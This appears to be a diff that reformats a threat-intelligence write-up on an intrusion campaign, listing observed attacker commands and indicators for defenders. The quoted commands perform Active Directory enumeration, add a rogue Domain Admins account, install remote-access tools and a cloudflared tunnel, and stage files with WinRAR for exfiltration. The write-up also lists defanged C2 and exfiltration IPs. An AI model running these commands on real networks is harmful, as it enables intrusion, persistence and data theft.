@@ -180,30 +180,38 @@ Discovery
  - Advanced_Port_Scanner
  - `Nltest /trusted_domains`
  - ping
- - ```Install-WindowsFeature RSAT-AD-PowerShell
+ ```
+Install-WindowsFeature RSAT-AD-PowerShell
 Get-ADComputer -Filter * -Property * | Select-Object Enabled,
 DNSHostName, IPv4Address, OperatingSystem, Description  >
-C:\programdata\[redacted].txt```
+C:\programdata\[redacted].txt
+```
  - `cmd.exe /Q /c nltest /domain_trusts 1> \\Windows\\Temp\\ysKBfL 2>&1`
  - `cmd.exe /Q /c quser 1> \\127.0.0.1\ADMIN$\__1754125023.3698354 2>&1`
  - `net group "Domain admins" /dom`
  - Adsubnets.csv, adGroups.tx, AdOUs.csv, AdCOmputers.txt, adUsers.txt and AdTrusts.txt (in weird path like C:\ or programdata)
- - ```Get-ADUser -Filter * -Properties * | Select-Object Enabled, CanonicalName,
+ ```
+   Get-ADUser -Filter * -Properties * | Select-Object Enabled, CanonicalName,
    CN, Name, SamAccountName, MemberOf, Company, Title, Description, Created,
    Modified, PasswordLastSet, LastLogonDate, logonCount, Department,
    telephoneNumber, MobilePhone, OfficePhone, EmailAddress, mail,
-   HomeDirectory, homeMDB > C:\ProgramData\AdUsers.txt```
+   HomeDirectory, homeMDB > C:\ProgramData\AdUsers.txt
+```
  
- - ```Get-ADUser -Filter * -Properties * | Select-Object Enabled, CanonicalName,
+```
+   Get-ADUser -Filter * -Properties * | Select-Object Enabled, CanonicalName,
    CN, Name, SamAccountName, MemberOf, Company, Title, Description, Created,
    Modified, PasswordLastSet, LastLogonDate, logonCount, Department,
    telephoneNumber, MobilePhone, OfficePhone, EmailAddress, mail,
-   HomeDirectory, homeMDB >> C:\ProgramData\REDACTED_Users.txt```
+   HomeDirectory, homeMDB >> C:\ProgramData\REDACTED_Users.txt
+```
  
- - ```Get-ADComputer -Filter * -Property * | Select-Object Enabled, Name,
+ ```
+   Get-ADComputer -Filter * -Property * | Select-Object Enabled, Name,
    DNSHostName, IPv4Address, OperatingSystem, Description, CanonicalName,
    servicePrincipalName, LastLogonDate, whenChanged, whenCreated >>
-   C:\ProgramData\REDACTED_Comps.txt```
+   C:\ProgramData\REDACTED_Comps.txt
+```
  - Powerview
  - SharpShares
    - `C:\programdata\SharpShares.exe /ldap:all /filter:netlogon,ipc$,print$
@@ -231,8 +239,7 @@ Lateral Movement
  - `"C:\Program Files\WinRAR\WinRAR.exe" a -ep1  -scul -r0 -iext -imon1 -- . X:\[Redacted]`
  - `c:\ProgramData\winrar.exe`
  - `C:\ProgramData\winrar-x64-712.exe`
- - ```winrar.exe a -m0 -v3g -tn365d -n*.txt -n*.pdf -n*.xls -n*.doc -n*.xlsx
--n*.docx -n*.BAK -n*.MDB  "C:\Data" "\\"<redacted>"```
+ - `winrar.exe a -m0 -v3g -tn365d -n*.txt -n*.pdf -n*.xls -n*.doc -n*.xlsx -n*.docx -n*.BAK -n*.MDB  "C:\Data" "\\"<redacted>"`
  - `C:\ProgramData\shares.txt`
  - `"C:\Program Files\FileZilla FTP Client\fzsftp.exe" -v`
  - Rclone
@@ -251,19 +258,19 @@ Persistence
 - `cmd.exe /Q /c net user backupSQL Password123$ /add /dom 1> \\Windows\\Temp\\tinhLg 2>&1`
 - `cmd.exe /Q /c net group "Domain Admins" backupSQL  /dom /add 1> \Windows\Temp\NDqyOI 2>&1`
 - Cloudflared tunnel  (`C:\programdata\ssh\cloudflared.exe`)
-   - ```New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server
-(sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action
-Allow -LocalPort 22```
+   - `New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server(sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22`
  
 cloudflared[.]exe service install REDACTED
 - `C:\ProgramData\cloudflared_msi_install.log.`
 _BASE64_TOKEN
 - Chrome remote desktop
 - Anydesk
-- ```“C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -command
+```
+“C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -command
 "(new-object
 System.Net.WebClient).DownloadFile('hxxp://download[.]anydesk[.]com/AnyDesk
-.exe';, 'C:\ProgramData\AnyDesk.exe')"```
+.exe';, 'C:\ProgramData\AnyDesk.exe')"
+```
 - rustdesk
 ```
 "C:\Windows\System32\cmd.exe" /C
@@ -411,10 +418,10 @@ kali
 - 107.155.93[.]154
 
 ### Possible c2 and file downloads observed by DarkTrace:
-·      137.184.126[.]86 – IP Address – Possible C2 endpoint
-·      85.239.52[.]96 – IP Address – Likely C2 endpoint
-·      hxxp://85.239.52[.]96:8000/vmwarecli  – URL – File download
-·      hxxp://137.184.126[.]86:8080/vmwaretools – URL – File download
+- 137.184.126[.]86 – IP Address – Possible C2 endpoint
+- 85.239.52[.]96 – IP Address – Likely C2 endpoint
+- hxxp://85.239.52[.]96:8000/vmwarecli  – URL – File download
+- hxxp://137.184.126[.]86:8080/vmwaretools – URL – File download
 
 
 ### Users created
@@ -434,6 +441,7 @@ rwdrv.sys  16f83f056177c4ec24c7e99d01ca9d9d6713bd0497eeedb777a3ffefa99c97f0
 
 
 ### Network IOCS
+```
 ASN , ORG
 AS199959 , CROWNCLOUD
 AS395092 , Shock Hosting LLC
@@ -499,10 +507,18 @@ Indicator	ASN	Type	Description
 170.130.165[.]42	AS62904 – Eonix Corporation	IPv4 Address	Command and Control
 162.210.196[.]101	AS30633 – Leaseweb Usa  Inc.	IPv4 Address	Exfiltration
 206.168.190[.]143	AS14315 – 1gservers  Llc	IPv4 Address	Exfiltration
-
+```
 ### MISC IOCs
 cloudflared token
 eyJhIjoiY2ZkNzlkNDEyYWFh**REDACTED**TVdZeE1USTJaR1E0WlRsaiJ9
 
 This is unrelated but you see much of the same ttps in this DFIR report which came out just as the activity was ramping up
 - https://thedfirreport.com/2025/08/05/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira/
+
+
+
+
+
+
+
+ 
